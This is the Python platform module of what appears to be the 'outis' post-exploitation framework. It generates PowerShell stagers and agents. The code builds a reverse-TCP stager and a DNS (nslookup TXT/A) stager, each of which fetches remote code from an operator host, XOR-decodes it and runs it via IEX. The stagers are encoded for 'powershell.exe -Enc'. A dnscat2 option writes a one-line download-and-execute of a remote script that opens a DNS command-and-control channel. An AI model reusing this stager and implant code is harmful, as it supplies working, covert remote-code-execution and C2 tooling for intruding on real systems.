from syhelpers.files import sanatizefilename
from syhelpers.log import *
import syhelpers.strings as helps
import syhelpers.encoding as encryption
import syhelpers.tls
from syhelpers.types import isint
from syplatform.platform import Platform
from syhelpers.modulebase import ModuleBase
import os.path
import base64


DEBUG_MODULE = "PlatformPowershell"
MIN_AGENT_LEN = 4000  # TODO: choose a value close to the real agent length
MAX_AGENT_LEN = 30 * 1024  # TODO: choose shorter value, when done writing agent => faster staging
SIGNATURE_ALGO = "SHA512"
SIGNATURE_LEN = 512
SIGNATURE_LEN_B64 = encryption.lenofb64coding(SIGNATURE_LEN)


class PlatformPowershell(Platform, ModuleBase):
    """
    platform code to provide a stager and an agent generator for powershell
    """

    # noinspection PyMissingConstructor
    def __init__(self, handler):
        """
        powershell plattform code
        """

        self.options = {
            'STAGED' : {
                'Description'   :   'Is the communication setup staged or not?',
                'Required'      :   True,
                'Value'         :   "TRUE",
                'Options'       :   ("TRUE", "FALSE")
            },
            'STAGEENCODING' : {
                'Description'   :   'Should we send the staged agent in an encoded form (obscurity, not for security!)',
                'Required'      :   True,
                'Value'         :   "TRUE",
                'Options'       :   ("TRUE", "FALSE")
            },
            'STAGEAUTHENTICATION' : {
                'Description'   :   'Should the stager verify the agent code before executing (RSA signature ' +
                                    'verification with certificate pinning)',
                'Required'      :   True,
                'Value'         :   "TRUE",
                'Options'       :   ("TRUE", "FALSE")
            },
            'STAGECERTIFICATEFILE' : {
                'Description'   :   'File path of a PEM with both RSA key and certificate to sign and verify ' +
                                    'staged agent with (you can generate a selfsigned cert by using the script ' +
                                    'gencert.sh initially)',
                'Required'      :   False,
                'Value'         :   "$TOOLPATH/data/outis.pem"
            },
            'AGENTTYPE': {
                'Description'   :   'Defines which agent should be used (the default outis agent for this ' +
                                    'plattform, or some third party software we support)',
                'Required'      :   True,
                'Value'         :   "DEFAULT",
                'Options'       :   ("DEFAULT", "DNSCAT2", "DNSCAT2DOWNLOADER")
            },
            'TIMEOUT': {
                'Description'   :   'Number of seconds to wait for each request (currently only supported by ' +
                                    'DNS stagers)',
                'Required'      :   True,
                'Value'         :   9
            },
            'RETRIES': {
                'Description'   :   'Retry each request for this number of times (currently only supported by ' +
                                    'DNS stagers)',
                'Required'      :   True,
                'Value'         :   2
            },
            'AGENTDEBUG': {
                'Description'   :   'Should the agent print and log debug messages',
                'Required'      :   True,
                'Value'         :   "FALSE",
                'Options'       :   ("TRUE", "FALSE")
            },
        }
        self.handler = handler
        self.platformpath = os.path.abspath(os.path.dirname(__file__))
        self.privatekey = None
        self.fingerprint = None
        self.certificate = None
        self.publickeyxml = None

    def setoption(self, name, value):
        """
        Sets option to value if possible.
        If STAGECERTIFICATEFILE has been changed, check consistency of its value.
        """

        if name.upper() == "STAGECERTIFICATEFILE":
            if not(self._validate_certificatefile("STAGECERTIFICATEFILE", value)):
                return True  # value found, but not set
            else:
                # reset all key/cert data, it might change now
                self.privatekey = None
                self.fingerprint = None
                self.certificate = None
                self.publickeyxml = None

        if name.upper() == "TIMEOUT" and (not isint(value) or int(value) < 1 or int(value) > 100):
            print_error("TIMEOUT should be 1 <= TIMEOUT <= 100")
            return True  # value found, but not set
        if name.upper() == "RETRIES" and (not isint(value) or int(value) < 0 or int(value) > 100):
            print_error("RETRIES should be 0 <= RETRIES <= 100")
            return True  # value found, but not set

        return ModuleBase.setoption(self, name, value)

    def _validate_certificatefile(self, name, filename):
        """
        validate the certificate file path for existance and if it can be loaded as certificate
        """

        filename = sanatizefilename(filename)

        if not os.path.isfile(filename):
            print_error("{} at {} does not exist".format(name, os.path.realpath(filename)))
            return False
        elif not self._tryload_certificatefile(filename):
            print_error("Could not load {}".format(name))
            return False
        else:
            return True

    @staticmethod
    def _tryload_certificatefile(filename):
        """
        try to load the certificate file
        """

        filename = sanatizefilename(filename)

        if syhelpers.tls.load_certificate(filename) and syhelpers.tls.load_privatekey(filename):
            return True
        else:
            return False

    def _sign_data(self, data):
        """
        sign the data with the already loaded private key
        """

        if not self.privatekey:
            return None
        return syhelpers.tls.create_signature(self.privatekey, data)

    def _getfingerprint(self):
        """
        returns the fingerprint = b64(sha512(rsapublickeyxml))
        to verify the server certificate in the stager and to also do stage encoding
        """

        return base64.b64encode(encryption.sha512(self.publickeyxml.encode())).decode()

    def _getrsapublickeyxml(self):
        if not self.certificate:
            return None
        else:
            publicnumbers = self.certificate.get_pubkey().to_cryptography_key().public_numbers()
            modulus = base64.b64encode(syhelpers.tls.int2bytes(publicnumbers.n)).decode()
            exponent = base64.b64encode(syhelpers.tls.int2bytes(publicnumbers.e)).decode()
            xml = '<RSAKeyValue><Modulus>{}</Modulus><Exponent>{}</Exponent></RSAKeyValue>'.format(modulus, exponent)
            return xml

    def _initkeycertificate(self):
        """
        load the private key and certificate from STAGECERTIFICATEFILE, calculate fingerprint and
        publickeyxml with them
        """

        if self.privatekey and self.fingerprint and self.certificate and self.publickeyxml:
            return  # all set up

        filename = sanatizefilename(self.options['STAGECERTIFICATEFILE']['Value'])

        self.privatekey = syhelpers.tls.load_privatekey(filename)
        if not self.privatekey:
            print_error("Failed to load privatekey, please check STAGECERTIFICATEFILE")
            return
        self.certificate = syhelpers.tls.load_certificate(filename)
        if not self.certificate:
            print_error("Failed to load certificate, please check STAGECERTIFICATEFILE")
            return
        self.publickeyxml = self._getrsapublickeyxml()
        self.fingerprint = self._getfingerprint()

    def validate_options(self):
        """
        validate the options for the platform
        Especially check validity of our STAGECERTIFICATEFILE if necessary
        """

        valid = ModuleBase.validate_options(self)

        # do we need STAGECERTIFICATEFILE and is it valid?
        if self.options['STAGED']['Value'] == "TRUE" and (self.options['STAGEENCODING']['Value'] == "TRUE"
                    or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE") \
                    or self.options['AGENTTYPE']['Value'] == "DNSCAT2" \
                    or self.options['AGENTTYPE']['Value'] == "DNSCAT2DOWNLOADER":
            if not self.options['STAGECERTIFICATEFILE']['Value'] \
                    or self.options['STAGECERTIFICATEFILE']['Value'] == "":
                print_error("STAGECERTIFICATEFILE must be set when using STAGEENCODING and/or " +
                            "STAGEAUTHENTICATION and/or DNSCAT2")
                valid = False
            elif not self._validate_certificatefile("STAGECERTIFICATEFILE",
                    self.options['STAGECERTIFICATEFILE']['Value']):
                valid = False

        if (self.options['AGENTTYPE']['Value'] == "DNSCAT2"
                or self.options['AGENTTYPE']['Value'] == "DNSCAT2DOWNLOADER") \
                and self.handler.options['TRANSPORT']['Value'] != "DNS":
            print_error("dnscat2 must be used with DNS transport, hence the name!")
            valid = False

        timeout = self.options['TIMEOUT']['Value']
        if not isint(timeout) or int(timeout) < 1 or int(timeout) > 100:
            print_error("TIMEOUT should be 1 <= TIMEOUT <= 100")
            valid = False

        retries = self.options['RETRIES']['Value']
        if not isint(retries) or int(retries) < 0 or int(retries) > 100:
            print_error("RETRIES should be 0 <= RETRIES <= 100")
            valid = False

        return valid

    def isstaged(self):
        """
        powershell platform can be staged by setting the option
        """

        return self.options['STAGED']['Value'] == "TRUE"

    def getstager(self):
        """
        Generate the stager string
        """

        if not self.isstaged():
            print_error("Platform is not staged. Consider changing option STAGED or generating agent directly.")
            return None
        if not self.handler.transport:
            print_error("Transport not set")
            return None

        # generate powershell + reversetcp stager
        if self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
            #TODO: implement TIMEOUT and RETRIES
            ip = self.handler.transport.options['CONNECTHOST']['Value'] \
                 or self.handler.transport.options['LHOST']['Value']
            if ip == "0.0.0.0":
                print_error("You should set a valid CONNECTHOST ip to connect to or change LHOST.")
                return None
            port = self.handler.transport.options['CONNECTPORT']['Value'] \
                   or self.handler.transport.options['LPORT']['Value']
            print_debug(DEBUG_MODULE, "ip = {}, port = {}".format(ip, port))

            # TODO: Consider using helps.randomize_capitalization(...)
            stager = '$c=New-Object net.sockets.TcpClient("{}",{});'.format(ip, port)
            stager += '$a=New-Object char[]({});'.format(MAX_AGENT_LEN)
            stager += '$r=New-Object IO.StreamReader($c.GetStream());'
            stager += '$b=0;'
            stager += 'while($b -lt {}){{$b+=$r.Read($a,$b,{}-$b)}};'.format(MIN_AGENT_LEN, MAX_AGENT_LEN)

        # generate powershell + dns stager
        elif self.handler.options['TRANSPORT']['Value'] == "DNS":
            zone = self.handler.transport.options['ZONE']['Value'].rstrip(".")
            server = self.handler.transport.options['DNSSERVER']['Value']
            dnstype = self.handler.transport.options['DNSTYPE']['Value']
            timeout = self.options['TIMEOUT']['Value']
            retries = self.options['RETRIES']['Value']
            print_debug(DEBUG_MODULE, "zone = {}, server = {}, dnstype = {}, timeout = {}, retries = {}"
                        .format(zone, server, dnstype, timeout, retries))

            if server is None:
                server = ""
            if int(timeout) == 2:  # 2 seconds is the default timeout for nslookup and can be ommited
                timeoutstr = ""
            else:
                timeoutstr = " -timeout={}".format(timeout)
            if int(retries) <= 0:  # 0 is no retries = 1 attempt in total, ommit all retry text
                retriesreset = ""
                retriestest = ""
            else:
                retriesreset = "$t=0;"
                retriestest = "if($t++-lt{}){{$i--;continue;}}".format(retries)

            # TODO: Consider using helps.randomize_capitalization(...)
            stager = '$r=Get-Random;'
            if dnstype == "TXT":
                stager += '$a="";{}for($i=0;;$i++){{'.format(retriesreset)
                stager += '$c=([string](IEX "nslookup -type=TXT{} s$($i)r$($r).{}. {}")).Split({})[1];'\
                    .format(timeoutstr, zone, server, "'\"'")
                stager += 'if(!$c){{{}break;}}{}$a+=$c;}}'.format(retriestest, retriesreset)
                stager += '$a=[Convert]::FromBase64String($a);'
            elif dnstype == "A":
                stager += '$a=New-Object char[](0);{}for($i=0;;$i++){{'.format(retriesreset)
                stager += '$c=([regex]"\s+").Split([string](IEX "nslookup -type=A{} s$($i)r$($r).{}. {}"));'\
                    .format(timeoutstr, zone, server)
                stager += 'if($c.Length-lt7-or$c.Length-gt11){{{}break;}}{}$a+=$c[-2].Split(".")}}'\
                    .format(retriestest, retriesreset)
                stager += '$a=$a|%{[Convert]::ToInt32($_)};'
            else:
                print_error("invalid DNSTYPE")
                return None

            stager += '$b=$a.Length;'

        # combination platform / transport currently not supported
        else:
            print_error("No stager for platform and transport found.")
            return None

        # include fingerprint only if needed for STAGEENCODING and/or STAGEAUTHENTICATION and/or DNSCAT2
        if self.options['STAGEENCODING']['Value'] == "TRUE" or self.options['STAGEAUTHENTICATION']['Value'] == "TRUE" \
                or self.options['AGENTTYPE']['Value'] == "DNSCAT2" \
                or self.options['AGENTTYPE']['Value'] == "DNSCAT2DOWNLOADER":  # dnscat2 needs the fingerprint as secret
            self._initkeycertificate()
            stager += '$fp="{}";'.format(self.fingerprint)

        # for stage encoding, include decoding algorithm here
        if self.options['STAGEENCODING']['Value'] == "TRUE":
            stager += '$i=0;$a=$a|%{$_-bXor$fp[$i++%$fp.Length]};'

        # for stage authentication, include fingerprint and verification code here
        if self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
            self._initkeycertificate()

            # split data in publickey, signature, agentcode:
            parsepos = 0  # next position to parse the array to string
            stager += '$pk=New-Object String($a,{},{});'.format(parsepos, len(self.publickeyxml))
            parsepos += len(self.publickeyxml)
            stager += '$sig=New-Object String($a,{},{});'.format(parsepos, SIGNATURE_LEN_B64)
            parsepos += SIGNATURE_LEN_B64
            stager += '$s=New-Object String($a,{},($b-{}));'.format(parsepos, parsepos)

            # verify the public key
            stager += '$sha=New-Object Security.Cryptography.SHA512Managed;'
            stager += 'if(@(Compare-Object $sha.ComputeHash($pk.ToCharArray()) ([Convert]::FromBase64String($fp)) ' \
                      '-SyncWindow 0).Length -ne 0){"ERROR1";Exit(1)};'  # check fingerprint of server cert

            # verify the signature of the code using the public key
            stager += '$x=New-Object Security.Cryptography.RSACryptoServiceProvider;'
            stager += '$x.FromXmlString($pk);'
            stager += 'if(-Not $x.VerifyData($s.ToCharArray(),"{}",[Convert]::FromBase64String($sig)))' \
                      '{{"ERROR2";Exit(2)}};'.format(SIGNATURE_ALGO)  # check signature of agent code

        # without stage authentication, no need for pk or signature yet
        else:
            stager += '$s=New-Object String($a,0,$b);'

        # finally execute the agent
        stager += '"GOAGENT";IEX $s;'
        print_debug(DEBUG_MODULE, "stager = {}".format(stager))
        return helps.powershell_launcher(stager, baseCmd="powershell.exe -Enc ")  # TODO: baseCmd

    def getagent(self, staged=None):
        """
        Generate the full powershell agent for this setup if possible
        :param staged: can be set to True or False to use that value, if not set self.isstaged() is used
        :return: encoded agent bytes
        """

        if staged is None:
            staged = self.isstaged()

        if self.options['AGENTTYPE']['Value'] == "DNSCAT2" or self.options['AGENTTYPE']['Value'] == "DNSCAT2DOWNLOADER":
            agent = self.getagent_dnscat2(staged=staged)

        elif self.options['AGENTTYPE']['Value'] == "DEFAULT":
            agent = self.getagent_default(staged=staged)

        else:
            print_error("AGENTTYPE is not defined")
            return None

        if agent is None:
            print_error("Generation for the AGENTTYPE failed")
            return None

        # strip comments and empty lines
        agent = helps.strip_powershell_comments(agent)

        if self.options['AGENTDEBUG']['Value'] == "FALSE":
            agent = helps.strip_debug_commands(agent)

        # ok, lets encode the agent
        agent = agent.encode('utf-8')
        print_debug(DEBUG_MODULE, "len(real agent) = {}".format(len(agent)))

        if staged and (self.options['STAGEAUTHENTICATION']['Value'] == "TRUE"
                       or self.options['STAGEENCODING']['Value'] == "TRUE"):
            self._initkeycertificate()

        # add spaces if the agent is too short for staging with REVERSETCP
        if staged and self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
            currentreallen = len(agent)
            if self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
                currentreallen += len(self.publickeyxml) + SIGNATURE_LEN_B64
            if currentreallen < MIN_AGENT_LEN:
                print_error("agent is shorter than staging read, adding some spaces")
                agent += b' ' * (MIN_AGENT_LEN-currentreallen)

        # add spaces if the agent lenght is not aligned to 4 bytes with DNS and type A
        if staged and self.handler.options['TRANSPORT']['Value'] == "DNS" \
                and self.handler.transport.options['DNSTYPE']['Value'] == "A":
            currentreallen = len(agent)
            if self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
                currentreallen += len(self.publickeyxml) + SIGNATURE_LEN_B64
            while currentreallen % 4 != 0:
                agent += b' '
                currentreallen += 1

        # with stage authentication: publickey + signature + agentcode
        if staged and self.options['STAGEAUTHENTICATION']['Value'] == "TRUE":
            if not self.publickeyxml:
                print_error("Cannot sign agent, since STAGEAUTHENTICATION is active but creating the publickeyxml " +
                            "failed. Maybe check STAGECERTIFICATEFILE or other error messages.")
                return None
            else:
                print_debug(DEBUG_MODULE, "publickey as xml = {}".format(self.publickeyxml))
                agent = self.publickeyxml.encode('utf-8') + base64.b64encode(self._sign_data(agent)) + agent

        # encode agent with fingerprint as encodingkey if active
        if staged and self.options['STAGEENCODING']['Value'] == "TRUE":
            if not self.fingerprint:
                print_error("Cannot encode agent, since STAGEENCODING is active but creating the certificate " +
                            "fingerprint failed. Maybe check STAGECERTIFICATEFILE or other error messages.")
                return None
            else:
                #print_debug(DEBUG_MODULE, "agent = {}".format(agent))
                #print_debug(DEBUG_MODULE, "fingerprint = {}".format(self.fingerprint))
                agent = encryption.xor_encode(agent, self.fingerprint)

        # check length for REVERSETCP staging
        if len(agent) > MAX_AGENT_LEN and staged \
                and self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
            print_error("agent is longer than stager buffer, staging will fail")

        return agent

    def getagent_dnscat2(self, staged=None):
        """
        Return the full dnscat2-powershell agent string
        :param staged: can be set to True or False to use that value, if not set self.isstaged() is used
        :return: agent string
        """

        if staged is None:
            staged = self.isstaged()

        if self.handler.options["TRANSPORT"]["Value"] != "DNS":
            print_error("dnscat2 must be used with DNS transport, hence the name!")
            return None

        # we need the fingerprint as a pre-shared secret
        if staged:  # if staged, fingerprint was already included in the stager
            secret = "$fp"
        else:
            self._initkeycertificate()
            secret = self.fingerprint

        if secret is None:
            print_error("dnscat2 needs a pre-shared secret, and we failed using the certificate " +
                        "fingerprint for some reason")
            return None

        # load agent from file dnscat2-powershell
        if self.options['AGENTTYPE']['Value'] == "DNSCAT2":
            f = open(sanatizefilename("$TOOLPATH/thirdpartytools/dnscat2-powershell/dnscat2.ps1"), 'r')
            agent = f.read()
            f.close()

        # or if you do not want to wait for ever for testing
        elif self.options['AGENTTYPE']['Value'] == "DNSCAT2DOWNLOADER":
            agent = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/" +\
                    "lukebaggett/dnscat2-powershell/master/dnscat2.ps1');"

        else:
            print_error("invalid AGENTTYPE: not DNSCAT2 or DNSCAT2DOWNLOADER")
            return None

        zone = self.handler.transport.options['ZONE']['Value'].rstrip(".")
        server = self.handler.transport.options['DNSSERVER']['Value']
        print_debug(DEBUG_MODULE, "zone = {}, server = {}".format(zone, server))
        if server is None:
            server = ""
        else:
            server = " -DNSServer "+str(server)

        # add execution with zone and pre shared secret
        agent += "Start-Dnscat2 -Domain {}{} -PreSharedSecret \"{}\";".format(zone, server, secret)

        return agent

    def getagent_default(self, staged=None):
        """
        return the default outis agent code
        :param staged: can be set to True or False to use that value, if not set self.isstaged() is used
        :return: agent string
        """

        if staged is None:
            # noinspection PyUnusedLocal
            staged = self.isstaged()

        agent = "$ADDTOSCRIPTS = \"\"\n$LOGFILE = $NULL\n"

        # add selected transport implementation
        if self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
            f = open(self.platformpath + "/transport/reversetcp.ps1", 'r')

        elif self.handler.options['TRANSPORT']['Value'] == "DNS":
            f = open(self.platformpath + "/transport/dns.ps1", 'r')

        # combination platform / transport currently not supported
        else:
            print_error("No agent module for platform and transport found.")
            return None

        agent += f.read()
        f.close()

        # add no channel encryption method
        if self.handler.options['CHANNELENCRYPTION']['Value'] == "NONE":
            pass  # no encryption needed

        # add selected channel encryption method TLS
        elif self.handler.options['CHANNELENCRYPTION']['Value'] == "TLS":
            f = open(self.platformpath + "/transport/tls.ps1", 'r')
            agent += f.read()
            f.close()

        # combination platform / channel encryption currently not supported
        else:
            print_error("No agent module for platform and channel encryption found.")
            return None

        # add message basics
        f = open(self.platformpath + "/message/message.ps1", 'r')
        agent += f.read()
        f.close()

        # add channel basics
        f = open(self.platformpath + "/message/channel.ps1", 'r')
        agent += f.read()
        f.close()

        # add debug log module
        if self.options['AGENTDEBUG']['Value'] == "TRUE":
            f = open(self.platformpath + "/helpers/logdebug.ps1", 'r')
            agent += f.read()
            f.close()

        # add message / error log
        f = open(self.platformpath + "/helpers/log.ps1", 'r')
        agent += f.read()
        f.close()

        # add agent base code
        f = open(self.platformpath + "/agent.ps1", 'r')
        agent += f.read()
        f.close()

        # get and replace some values
        if self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
            ip = self.handler.transport.options['CONNECTHOST']['Value'] \
                 or self.handler.transport.options['LHOST']['Value']
            if ip == "0.0.0.0":
                print_error("You should set a valid CONNECTHOST ip to connect to or change LHOST.")
                return None
            port = self.handler.transport.options['CONNECTPORT']['Value'] \
                   or self.handler.transport.options['LPORT']['Value']
            print_debug(DEBUG_MODULE, "ip = {}, port = {}".format(ip, port))

            agent = agent.replace('SYREPLACE_CONNECTIONMETHOD', "REVERSETCP")
            agent = agent.replace('SYREPLACE_CONNECTHOST', str(ip))
            agent = agent.replace('SYREPLACE_CONNECTPORT', str(port))

        elif self.handler.options['TRANSPORT']['Value'] == "DNS":
            zone = self.handler.transport.options['ZONE']['Value'].rstrip(".")
            server = self.handler.transport.options['DNSSERVER']['Value'] or ""
            timeout = self.options['TIMEOUT']['Value']
            retries = self.options['RETRIES']['Value']
            print_debug(DEBUG_MODULE, "zone = {}, server = {}, timeout = {}, retries = {}"
                        .format(zone, server, timeout, retries))

            agent = agent.replace('SYREPLACE_CONNECTIONMETHOD', "DNS")
            agent = agent.replace('SYREPLACE_DNSZONE', str(zone))
            agent = agent.replace('SYREPLACE_DNSSERVER', str(server))
            agent = agent.replace('SYREPLACE_TIMEOUT', str(timeout))
            agent = agent.replace('SYREPLACE_RETRIES', str(retries))

        # combination platform / transport currently not supported
        else:
            print_error("No agent module for platform and transport found.")
            return None

        # replace channel encryption property
        agent = agent.replace('SYREPLACE_CHANNELENCRYPTION', self.handler.options['CHANNELENCRYPTION']['Value'])

        # add fingerprint if not staged and needed for TLS
        if not staged and self.handler.options['CHANNELENCRYPTION']['Value'] == "TLS":
            self._initkeycertificate()
            agent = agent.replace('SYREPLACE_SERVERCERTFINGERPRINT', self.fingerprint)

        return agent
